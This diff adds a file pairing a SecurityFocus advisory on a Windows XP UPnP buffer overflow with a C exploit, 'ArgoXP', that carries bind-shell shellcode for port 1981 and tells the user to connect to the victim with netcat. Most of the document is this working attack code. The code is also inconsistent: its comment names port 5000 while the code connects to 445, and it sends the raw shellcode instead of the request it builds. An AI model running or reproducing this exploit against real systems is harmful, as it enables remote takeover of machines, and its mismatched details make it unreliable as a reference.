@@ -1,0 +1,165 @@
+source: http://www.securityfocus.com/bid/3723/info
+ 
+Universal Plug and Play, or UPnP, is a service that allows for hosts to locate and use devices on the local network. UPnP support ships with Windows XP and ME. For Windows 98 and 98SE, it is available with Windows XP's Internet Connection Sharing client. It should be noted that UPnP services are enabled on Windows XP by default.
+ 
+When processing the location field in a NOTIFY directive, UPnP server process memory can be overwritten by data that originated in the packet. If the IP address, port and filename components are of excessive length, access violations will occur when the server attempts to dereference pointers overwritten with data from the packet.
+ 
+It should be noted that the service listens on broadcast and multicast interfaces. This could permit an attacker to exploit a number of systems without knowing their individual IP addresses, if they employed an exploitation method targeting a UDP port. It is however possible to exploit this condition using either the TCP or UDP protocols.
+ 
+The UPnP service runs in the LOCAL SERVICE security context. An attacker who successfully exploits this vulnerability could gain control over the target host. 
+
+/*
+
+***************** EXPLOIT CODED BY JOCANOR *****************
+
+**************PRIVATE DO NOT DISTRIBUTE*********************
+
+this is a new and functional exploit for de vulnerability
+affects to windows xp, at the service UPNP, port 5000.
+
+this exploit is a part of ASQ12 project, same as XPhack.c coded
+also be me...
+
+you only type:
+
+  argoxp victimip
+
+and later, in another cmd type:
+
+  nc victimip 1981
+
+note:
+
+you need netcat.
+
+note2:
+
+this exploit affects to windows xp + sp0 english version.
+
+***************** EXPLOIT CODED BY JOCANOR *****************
+
+*/
+#include <stdio.h>
+#include <windows.h>
+
+#pragma comment(lib, "ws2_32")
+
+char shell[] = //bind port 1981
+        "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
+        "\xEB\x05\xE8\xEB\xFF\xFF\xFF"
+        "\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
+        "\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
+        "\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
+        "\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
+        "\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
+        "\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
+        "\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
+        "\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
+        "\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
+        "\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
+        "\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
+        "\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
+        "\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
+        "\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
+        "\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
+        "\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
+        "\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
+        "\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
+        "\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
+        "\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
+        "\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
+        "\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
+        "\xFA\xFA\xFC\xE9\xED\x99";
+
+
+int main(int argc, char *argv[])
+
+{
+
+char recvbuf[1600];
+char szRequest[2048];
+char szJmpCode[281];
+char szExeCode[840];
+int i;
+WSADATA wsa;
+struct hostent *he;
+struct sockaddr_in their_addr;
+int len, sockfd;
+short dport = 445;
+
+
+printf("\n                  ArgoXP 1.0 beta     \n");
+printf("              ExPlOiT CoDeD By: JoCaNoR \n");
+printf("Member of: SlackTeam...Jocanor, nkde, zet4 & zerok\n");
+printf("          .-.-.Especial thanks to Neo_geno & Lide.-.-.\n\n");
+
+if (argc < 2)
+{
+printf("How to use: ");
+printf("Argoxp <victim ip>\n\n");
+exit(0);
+}
+
+for(i=0; i<268; i++) szJmpCode[i]=(char)0x90;
+
+szJmpCode[268]=(char)0x4D; szJmpCode[269]=(char)0x3F;
+szJmpCode[270]=(char)0xE3; szJmpCode[271]=(char)0x77;
+szJmpCode[272]=(char)0x90; szJmpCode[273]=(char)0x90;
+szJmpCode[274]=(char)0x90; szJmpCode[275]=(char)0x90;
+
+
+szJmpCode[276]=(char)0xFF; szJmpCode[277]=(char)0x63;
+szJmpCode[278]=(char)0x64; szJmpCode[279]=(char)0x90;
+szJmpCode[280]=(char)0x00;
+
+for(i=0; i<32; i++) szExeCode[i]=(char)0x90;
+szExeCode[32]=(char)0x00;
+
+strcat(szExeCode, shell);
+sprintf(szRequest, "%s%s\r\n\r\n", szJmpCode, szExeCode);
+
+WSAStartup(MAKEWORD(2,0),&wsa);
+
+if ((he=gethostbyname(argv[1])) == NULL)
+{
+perror("Unable to resolve");
+exit(1);
+}
+
+if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+{
+perror("socket error");
+exit(1);
+}
+
+their_addr.sin_family = AF_INET;
+their_addr.sin_port = htons(dport);
+their_addr.sin_addr = *((struct in_addr *)he->h_addr);
+memset(&(their_addr.sin_zero), '\0', 8);
+
+printf("Waiting for connection...");
+if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
+{
+printf("\nError, unable to connect!!!");
+exit(1);
+}
+
+printf("Connected!!!\n");
+
+if (send(sockfd, shell, sizeof(shell)-1, 0) == -1)
+{
+printf("Error :(:(:(\n");
+exit(1);
+}
+
+printf("OoOoOps shell!!\n");
+len = recv(sockfd, recvbuf, 1600, 0);
+
+return 0;
+
+
+
+}
+
+//***************** EXPLOIT CODED BY JOCANOR *****************
+
